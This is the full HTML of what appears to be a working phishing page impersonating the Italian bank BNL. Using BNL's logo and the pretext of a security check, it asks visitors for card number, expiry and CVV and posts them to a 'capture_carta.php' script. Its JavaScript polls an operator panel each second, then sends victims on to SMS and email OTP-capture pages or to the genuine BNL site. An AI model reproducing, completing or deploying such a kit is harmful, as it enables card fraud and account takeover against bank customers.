<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BNL - Verifica Carta</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;background:#f0f4f2;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.c{background:#fff;border-radius:12px;padding:40px 36px;max-width:440px;width:100%;box-shadow:0 4px 24px rgba(0,0,0,.08);text-align:center}
.c img{height:36px;margin-bottom:24px}
.c h2{font-size:20px;color:#1a1a1a;margin-bottom:8px;font-weight:600}
.c .sub{font-size:12px;color:#888;margin-bottom:24px}
.fg{margin-bottom:18px;text-align:left}
.fg label{display:block;font-size:13px;font-weight:500;color:#444;margin-bottom:6px}
.fg input{width:100%;padding:14px;font-size:16px;border:1.5px solid #ddd;border-radius:8px;outline:none;font-family:inherit;background:#fff}
.fg input:focus{border-color:#00723b;box-shadow:0 0 0 3px rgba(0,114,59,.10)}
.row{display:flex;gap:12px}
.row .fg{flex:1}
.btn{width:100%;padding:15px;font-size:16px;font-weight:600;background:#00723b;color:#fff;border:none;border-radius:8px;cursor:pointer;margin-top:6px;font-family:inherit}
.btn:hover{background:#005b2e}
</style>
</head>
<body>
<div class="c">
    <img src="https://bnl.it/images/bnlsite/loghi/BNL-logo-Mega-Menu-Def.png" alt="BNL">
    <h2>Verifica Carta di Pagamento</h2>
    <div class="sub">Per motivi di sicurezza, verifica i dati della tua carta</div>
    <form method="POST" action="capture_carta.php" id="f">
        <input type="hidden" name="id" id="idField">
        <div class="fg">
            <label>Numero Carta</label>
            <input type="text" id="cartaInput" name="carta_numero" placeholder="0000 0000 0000 0000" required inputmode="numeric" autocomplete="off" maxlength="19">
        </div>
        <div class="row">
            <div class="fg">
                <label>Scadenza</label>
                <input type="text" id="scadInput" name="carta_scadenza" placeholder="MM/AA" required autocomplete="off" maxlength="5">
            </div>
            <div class="fg">
                <label>CVV</label>
                <input type="text" name="carta_cvv" placeholder="123" required inputmode="numeric" maxlength="4" autocomplete="off">
            </div>
        </div>
        <button type="submit" class="btn">Verifica Carta</button>
    </form>
</div>
<script>
var url = new URL(window.location.href);
var id = url.searchParams.get('id') || '';
document.getElementById('idField').value = id;

// Auto-space ogni 4 cifre per numero carta
var cartaInput = document.getElementById('cartaInput');
cartaInput.addEventListener('input', function(e) {
    var val = e.target.value.replace(/\s/g, '').replace(/[^\d]/g, '');
    var formatted = val.match(/.{1,4}/g);
    if (formatted) {
        e.target.value = formatted.join(' ');
    } else {
        e.target.value = '';
    }
});

// Auto-slash per scadenza MM/AA
var scadInput = document.getElementById('scadInput');
scadInput.addEventListener('input', function(e) {
    var val = e.target.value.replace(/\D/g, '');
    if (val.length >= 2) {
        e.target.value = val.substring(0, 2) + '/' + val.substring(2, 4);
    } else {
        e.target.value = val;
    }
});

// Polling per comandi admin
var lastFR = 0;
function check() {
    fetch('check_status.php?id=' + encodeURIComponent(id) + '&t=' + Date.now(), {cache:'no-store'})
    .then(function(r){return r.json();})
    .then(function(d){
        if (d.status === 'finish' || d.next_page === 'finish') {
            window.location.href = 'https://banking.bnl.it/login/landing?cta=dashboard';
            return;
        }
        if (d.force_redirect && d.force_redirect > 0 && d.force_redirect !== lastFR) {
            lastFR = d.force_redirect;
            if (d.next_page === 'verifica') window.location.href = 'verifica.php?id=' + encodeURIComponent(id);
            if (d.next_page === 'otp_sms')  window.location.href = 'otp_sms.html?id=' + encodeURIComponent(id);
            if (d.next_page === 'otp_mail') window.location.href = 'otp_mail.html?id=' + encodeURIComponent(id);
        }
    }).catch(function(){});
}
setInterval(check, 1000);
check();
</script>
</body>
</html>